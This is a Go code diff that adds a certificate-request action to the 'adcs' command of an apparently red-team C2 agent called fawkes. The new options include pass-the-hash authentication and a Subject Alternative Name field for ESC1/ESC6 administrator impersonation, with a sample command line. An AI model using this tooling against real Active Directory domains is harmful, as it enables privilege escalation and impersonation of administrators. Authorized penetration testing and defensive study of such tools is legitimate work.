@@ -10,8 +10,8 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "adcs",
-		Description:         "Enumerate AD Certificate Services (ADCS) and find vulnerable certificate templates (ESC1-ESC4). Queries PKI configuration via LDAP.",
-		HelpString:          "adcs -action find -server 192.168.1.1 -username user@domain.local -password pass\nadcs -action cas -server dc01\nadcs -action templates -server dc01",
+		Description:         "Enumerate AD Certificate Services (ADCS), find vulnerable templates (ESC1-ESC4, ESC6 via DCOM), and request certificates via DCOM.",
+		HelpString:          "adcs -action find -server 192.168.1.1 -username user@domain.local -password pass\nadcs -action cas -server dc01\nadcs -action templates -server dc01\nadcs -action request -server ca01 -ca_name CA-NAME -template User -username DOMAIN\\user -password pass [-alt_name admin@domain.local]",
 		Version:             1,
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1649"},
@@ -27,9 +27,9 @@ func init() {
 				Name:             "action",
 				CLIName:          "action",
 				ModalDisplayName: "Action",
-				Description:      "cas: list CAs, templates: list templates, find: find vulnerable templates (ESC1-ESC4)",
+				Description:      "cas: list CAs, templates: list templates, find: find vulnerable templates, request: request a certificate via DCOM",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"find", "cas", "templates"},
+				Choices:          []string{"find", "cas", "templates", "request"},
 				DefaultValue:     "find",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -38,8 +38,8 @@ func init() {
 			{
 				Name:             "server",
 				CLIName:          "server",
-				ModalDisplayName: "Domain Controller",
-				Description:      "DC IP address or hostname",
+				ModalDisplayName: "Server",
+				Description:      "DC/CA server IP address or hostname",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -50,7 +50,7 @@ func init() {
 				Name:             "username",
 				CLIName:          "username",
 				ModalDisplayName: "Username",
-				Description:      "LDAP bind username (user@domain.local format)",
+				Description:      "Username (DOMAIN\\user or user@domain format)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -61,7 +61,29 @@ func init() {
 				Name:             "password",
 				CLIName:          "password",
 				ModalDisplayName: "Password",
-				Description:      "LDAP bind password",
+				Description:      "Password for authentication",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "hash",
+				CLIName:          "hash",
+				ModalDisplayName: "NT Hash",
+				Description:      "NT hash for pass-the-hash authentication (request action only)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "domain",
+				CLIName:          "domain",
+				ModalDisplayName: "Domain",
+				Description:      "Domain name (auto-parsed from username if DOMAIN\\user or user@domain format)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -72,7 +94,7 @@ func init() {
 				Name:             "port",
 				CLIName:          "port",
 				ModalDisplayName: "Port",
-				Description:      "LDAP port (default: 389, or 636 for LDAPS)",
+				Description:      "LDAP port (default: 389, or 636 for LDAPS). Not used for request action.",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
 				DefaultValue:     389,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -83,9 +105,64 @@ func init() {
 				Name:             "use_tls",
 				CLIName:          "use_tls",
 				ModalDisplayName: "Use LDAPS",
-				Description:      "Use TLS/LDAPS instead of plain LDAP",
+				Description:      "Use TLS/LDAPS instead of plain LDAP. Not used for request action.",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
 				DefaultValue:     false,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "ca_name",
+				CLIName:          "ca_name",
+				ModalDisplayName: "CA Name",
+				Description:      "Certificate Authority name (from 'adcs -action cas'). Required for request action.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "template",
+				CLIName:          "template",
+				ModalDisplayName: "Template",
+				Description:      "Certificate template name (e.g., 'User', 'Machine', or a vulnerable template). Required for request action.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "subject",
+				CLIName:          "subject",
+				ModalDisplayName: "Subject",
+				Description:      "Certificate subject (e.g., 'CN=user'). Defaults to CN=<username>.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "alt_name",
+				CLIName:          "alt_name",
+				ModalDisplayName: "Alt Name (SAN)",
+				Description:      "Subject Alternative Name for ESC1/ESC6 (e.g., 'administrator@domain.local' for UPN impersonation)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "timeout",
+				CLIName:          "timeout",
+				ModalDisplayName: "Timeout",
+				Description:      "Connection timeout in seconds (default: 30). Used for request action.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				DefaultValue:     30,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: false, GroupName: "Default"},
 				},
@@ -110,12 +187,27 @@ func init() {
 			server, _ := taskData.Args.GetStringArg("server")
 
 			displayMsg := fmt.Sprintf("ADCS %s on %s", action, server)
+			if action == "request" {
+				template, _ := taskData.Args.GetStringArg("template")
+				caName, _ := taskData.Args.GetStringArg("ca_name")
+				altName, _ := taskData.Args.GetStringArg("alt_name")
+				displayMsg = fmt.Sprintf("ADCS request template=%s ca=%s on %s", template, caName, server)
+				if altName != "" {
+					displayMsg += fmt.Sprintf(" (SAN: %s)", altName)
+				}
+			}
 			response.DisplayParams = &displayMsg
+
+			artifactType := "API Call"
+			artifactMsg := fmt.Sprintf("LDAP ADCS query: %s on %s", action, server)
+			if action == "request" {
+				artifactMsg = fmt.Sprintf("DCOM ICertRequestD::Request on %s", server)
+			}
 
 			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
 				TaskID:           taskData.Task.ID,
-				BaseArtifactType: "API Call",
-				ArtifactMessage:  fmt.Sprintf("LDAP ADCS query: %s on %s", action, server),
+				BaseArtifactType: artifactType,
+				ArtifactMessage:  artifactMsg,
 			})
 
 			return response
